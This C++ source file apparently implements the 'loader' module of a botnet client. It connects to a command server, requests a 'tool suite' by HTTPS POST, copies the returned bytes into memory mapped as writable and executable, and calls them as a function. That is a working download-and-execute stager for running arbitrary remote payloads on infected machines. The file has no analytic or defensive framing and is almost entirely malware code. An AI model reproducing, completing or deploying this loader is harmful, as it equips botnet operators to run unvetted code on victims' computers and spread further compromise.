#include "LoaderModule.h"
#include "BotLogger.h"
#include <sys/mman.h>

LoaderModule::LoaderModule(const std::string &server_address, int server_port)
    : NetworkModule(server_address, server_port) {}

LoaderModule::~LoaderModule() { get_socket().lowest_layer().close(); }

std::string LoaderModule::get_module_name() const { return "loader"; }

void LoaderModule::execute_tool(const std::vector<std::byte> &tool) {
  BotLogger::getInstance().save_log("Preparing tool execution...",
                                    LogLevel::INFO, BotModules::LOADER);
  void *executable_memory =
      mmap(nullptr, tool.size(), PROT_READ | PROT_WRITE | PROT_EXEC,
           MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
  if (executable_memory == MAP_FAILED) {
    BotLogger::getInstance().save_log("Failed to allocate memory for tool",
                                      LogLevel::ERROR, BotModules::LOADER);
    return;
  }
  std::memcpy(executable_memory, tool.data(), tool.size());
  auto function = (void (*)())(executable_memory);
  try {
    BotLogger::getInstance().save_log("Executing tool...", LogLevel::INFO,
                                      BotModules::LOADER);
    function();
  } catch (const std::exception &e) {
    BotLogger::getInstance().save_log("Failed to execute tool", LogLevel::ERROR,
                                      BotModules::LOADER);
    BotLogger::getInstance().save_exception(e, LogLevel::ERROR,
                                            BotModules::LOADER);
  }
  munmap(executable_memory, tool.size());
  BotLogger::getInstance().save_log("Tool executed successfully",
                                    LogLevel::INFO, BotModules::LOADER);
}

void LoaderModule::download_tool(const nlohmann::json &tool_suite) {
  try {
    if (!connect_to_server()) {
      return;
    }
    BotLogger::getInstance().save_log("Downloading tool...", LogLevel::INFO,
                                      BotModules::LOADER);
    std::vector<std::byte> tool_data =
        BotEssentials::getInstance().json_to_bytes(tool_suite);
    std::vector<std::byte> response;
    send_https_post_request(m_api_endpoints["tool_suites"], tool_data, response,
                            "application/json");

    if (response.empty()) {
      BotLogger::getInstance().save_log("Failed to download tool",
                                        LogLevel::ERROR, BotModules::LOADER);
      return;
    }
    execute_tool(response);
  } catch (const std::exception &e) {
    BotLogger::getInstance().save_log("Failed to download tool",
                                      LogLevel::ERROR, BotModules::LOADER);
    BotLogger::getInstance().save_exception(e, LogLevel::ERROR,
                                            BotModules::LOADER);
  }
}

void LoaderModule::execute_module(const nlohmann::json &instructions) {
  try {
    BotLogger::getInstance().save_log("Executing Loader module...",
                                      LogLevel::INFO, BotModules::LOADER);
    for (const auto &instruction : instructions) {
      if (instruction.contains("tool_suite")) {
        download_tool(instruction["tool_suite"]);
      }
    }
  } catch (const std::exception &e) {
    BotLogger::getInstance().save_exception(e, LogLevel::ERROR,
                                            BotModules::LOADER);
  }
}
